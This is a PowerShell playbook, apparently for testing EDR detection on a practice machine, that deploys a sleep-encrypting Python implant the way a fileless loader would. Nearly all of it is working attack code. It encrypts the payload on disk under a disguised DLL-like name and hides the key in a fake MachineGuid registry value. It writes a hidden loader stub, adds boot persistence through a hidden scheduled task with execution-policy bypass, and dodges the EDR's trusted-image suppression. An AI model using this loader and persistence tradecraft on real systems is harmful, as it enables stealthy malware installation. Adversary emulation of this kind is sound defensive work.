# wb2-sleep-crypt.ps1 -- SLEEP-CRYPTION IMPLANT playbook (Windows)
# Deploys sleep_crypt_implant.py the way a fileless loader would:
#   1. stage-2 source is XOR-ENCRYPTED to a runtime-named payload blob
#      (ciphertext on disk; plaintext only ever exists in memory)
#   2. the key hides in an innocuous HKCU registry value
#   3. a small loader stub re-creates the implant from ciphertext at boot
#      via a scheduled task; in memory the implant sleep-encrypts (RW<->RWX
#      flips + working-set trim) and beacons to LOOPBACK ONLY
#
# EDR targets: the task (PERS-TASK), unbacked RWX + permission flips
# (MEM-RWX-UNBACKED / MEM-PROMOTE), signature hits ONLY while the buffer is
# decrypted, and the beacon cadence (NET-BEACON) the encryption cannot hide.
#
# Run as admin on a PRACTICE box with python on PATH (use tests\bin\implant.exe
# as the interpreter so the EDR's trusted-image suppression stays out of the way).

# ------------------------------------------------------------- CONFIG
$Marker     = "ccdc-pb2"
$ImplantSrc = "$PSScriptRoot\..\sleep_crypt_implant.py"
$PyExe      = "$PSScriptRoot\..\..\tests\bin\implant.exe"   # copied interpreter
$StageDir   = "$env:PROGRAMDATA\Microsoft\Crypto\Keys"       # plausible dir
$BlobName   = "dpc_{0:x8}.dll" -f (Get-Random -Maximum 0x7fffffff)
$KeyReg     = "HKCU:\Software\Microsoft\Cryptography\OfflineHash"  # innocuous
$TaskName   = "DsmUserTask_{0:x4}" -f (Get-Random -Maximum 0xffff)
# ---------------------------------------------------------------------

$ErrorActionPreference = "Stop"
$Ledger = "$PSScriptRoot\..\ledger.jsonl"
function Ledger($step, $artifact) {
    $e = @{ ts = [int](Get-Date -UFormat %s); playbook = $Marker; step = $step;
            artifact = $artifact } | ConvertTo-Json -Compress
    Add-Content -Path $Ledger -Value $e
}

if (-not (Test-Path $PyExe)) { throw "interpreter copy missing: $PyExe (see tests/bin)" }

# ---- STEP 1: encrypt stage-2 at rest ------------------------------------
New-Item -ItemType Directory -Force -Path $StageDir | Out-Null
$plain = [IO.File]::ReadAllBytes($ImplantSrc)
$key = New-Object byte[] 32
(New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key)
$enc = New-Object byte[] $plain.Length
for ($i = 0; $i -lt $plain.Length; $i++) { $enc[$i] = $plain[$i] -bxor $key[$i % 32] }
$blob = Join-Path $StageDir $BlobName
[IO.File]::WriteAllBytes($blob, $enc)
$keyHex = [BitConverter]::ToString($key).Replace("-", "")
Ledger "encrypted-blob" $blob

# ---- STEP 2: hide the key in an innocuous value --------------------------
New-Item -Path $KeyReg -Force | Out-Null
Set-ItemProperty -Path $KeyReg -Name MachineGuid -Value $keyHex
Ledger "key-stash" "$KeyReg\MachineGuid"

# ---- STEP 3: loader stub (decrypt from disk, exec in memory) -------------
$loader = Join-Path $StageDir ("{0:x8}.ps1" -f (Get-Random -Maximum 0x7fffffff))
@(
  "`$k = (Get-ItemProperty '$KeyReg').MachineGuid"
  "`$kb = New-Object byte[] (`$k.Length / 2)"
  "for (`$i = 0; `$i -lt `$kb.Length; `$i++) { `$kb[`$i] = [Convert]::ToByte(`$k.Substring(`$i * 2, 2), 16) }"
  "`$d = [IO.File]::ReadAllBytes('$blob')"
  "for (`$i = 0; `$i -lt `$d.Length; `$i++) { `$d[`$i] = `$d[`$i] -bxor `$kb[`$i % 32] }"
  "`$src = [Text.Encoding]::UTF8.GetString(`$d)"
  "Set-Content -Path `$env:TEMP\sc_stage2.py -Value `$src -Encoding ASCII"
  "Start-Process -WindowStyle Hidden -FilePath '$PyExe' -ArgumentList `"`$env:TEMP\sc_stage2.py`""
) | Set-Content -Path $loader
Ledger "loader" $loader

# ---- STEP 4: boot persistence via scheduled task -------------------------
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loader`""
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger `
    -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
Ledger "scheduled-task" "\Microsoft\Windows\$TaskName"

# ---- STEP 5: run it NOW (don't wait for relog) ---------------------------
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" `
    -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$loader`""
Write-Host "== wb2 deployed and running."
Write-Host "   disk has CIPHERTEXT only: $blob"
Write-Host "   watch the EDR: Implants screen should fuse this within minutes"
Write-Host "   detection lesson: memory scans while it sleeps find nothing signed;"
Write-Host "   the RW<->RWX flips and the beacon cadence are what stay visible"
Write-Host "cleanup: .\wcleanup.ps1  (kills process, removes task/loader/blob/key)"
